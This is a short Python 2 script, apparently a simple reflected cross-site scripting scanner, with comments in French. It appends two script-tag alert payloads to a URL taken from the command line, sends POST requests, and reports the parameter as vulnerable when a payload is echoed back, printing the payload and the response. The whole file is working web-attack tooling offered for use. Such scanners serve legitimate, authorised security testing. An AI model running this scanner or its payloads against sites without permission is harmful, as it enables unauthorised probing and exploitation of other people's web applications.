import requests
import sys

url = sys.argv[1]
payloads = ['<script>alert(1);</script>', '"><script>alert(1);</script>']
for payloads in payloads:
    req = requests.post(url+payloads)
    if payloads in req.text:
        print "parametre est vulnerable\r\n"
        print "payload : " + payloads
        print req.text
        break

